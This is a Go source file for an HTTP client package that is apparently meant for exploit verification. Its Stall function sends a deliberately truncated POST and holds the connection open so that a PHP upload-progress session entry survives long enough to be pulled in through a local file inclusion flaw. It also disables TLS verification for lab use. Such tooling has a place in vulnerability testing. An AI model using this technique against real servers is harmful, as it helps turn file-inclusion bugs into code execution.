// Package probe is a small HTTP client tuned for exploit verification:
// it keeps raw responses, disables redirects, and can hold a request open
// mid-body so that a PHP upload-progress session entry survives long enough
// to be included via an LFI.
package probe

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"strings"
	"time"
)

const maxBody = 4 << 20

// Client performs verification requests.
type Client struct {
	Timeout  time.Duration
	Insecure bool
}

// New returns a Client with a sane default timeout.
func New(timeout time.Duration) *Client {
	if timeout <= 0 {
		timeout = 10 * time.Second
	}
	return &Client{Timeout: timeout}
}

// Response is a fully buffered HTTP response.
type Response struct {
	Status int
	Header http.Header
	Body   []byte
}

func (c *Client) httpClient() *http.Client {
	tr := &http.Transport{
		Proxy:              http.ProxyFromEnvironment,
		DisableCompression: true,
		TLSClientConfig:    &tls.Config{InsecureSkipVerify: c.Insecure}, // lab certificates only
	}
	return &http.Client{
		Timeout:   c.Timeout,
		Transport: tr,
		CheckRedirect: func(*http.Request, []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
}

// Get performs a GET request.
func (c *Client) Get(rawURL string, headers map[string]string) (*Response, error) {
	req, err := http.NewRequest(http.MethodGet, rawURL, nil)
	if err != nil {
		return nil, err
	}
	return c.Do(req, headers)
}

// Post performs a POST request with body and contentType.
func (c *Client) Post(rawURL string, body []byte, contentType string, headers map[string]string) (*Response, error) {
	req, err := http.NewRequest(http.MethodPost, rawURL, bytes.NewReader(body))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", contentType)
	return c.Do(req, headers)
}

// Do executes req and buffers the response.
func (c *Client) Do(req *http.Request, headers map[string]string) (*Response, error) {
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	resp, err := c.httpClient().Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(io.LimitReader(resp.Body, maxBody))
	if err != nil {
		return nil, err
	}
	return &Response{Status: resp.StatusCode, Header: resp.Header, Body: body}, nil
}

// Stall opens a raw connection, sends a POST whose Content-Length is larger
// than the bytes actually written, and returns the open connection. The PHP
// upload-progress entry is created as soon as the filename part has been
// parsed, so the caller can trigger the LFI and close the connection later.
func (c *Client) Stall(rawURL, contentType string, declared int64, prefix []byte, headers map[string]string) (net.Conn, error) {
	u, err := url.Parse(rawURL)
	if err != nil {
		return nil, err
	}
	host := u.Host
	if u.Port() == "" {
		if u.Scheme == "https" {
			host += ":443"
		} else {
			host += ":80"
		}
	}

	dialer := &net.Dialer{Timeout: c.Timeout}
	var conn net.Conn
	if u.Scheme == "https" {
		conn, err = tls.DialWithDialer(dialer, "tcp", host, &tls.Config{InsecureSkipVerify: c.Insecure})
	} else {
		conn, err = dialer.Dial("tcp", host)
	}
	if err != nil {
		return nil, err
	}

	var head strings.Builder
	fmt.Fprintf(&head, "POST %s HTTP/1.1\r\n", u.RequestURI())
	fmt.Fprintf(&head, "Host: %s\r\n", u.Host)
	fmt.Fprintf(&head, "Content-Type: %s\r\n", contentType)
	fmt.Fprintf(&head, "Content-Length: %d\r\n", declared)
	head.WriteString("Connection: close\r\n")
	for k, v := range headers {
		fmt.Fprintf(&head, "%s: %s\r\n", k, v)
	}
	head.WriteString("\r\n")

	if _, err := io.WriteString(conn, head.String()); err != nil {
		conn.Close()
		return nil, err
	}
	if _, err := conn.Write(prefix); err != nil {
		conn.Close()
		return nil, err
	}
	return conn, nil
}
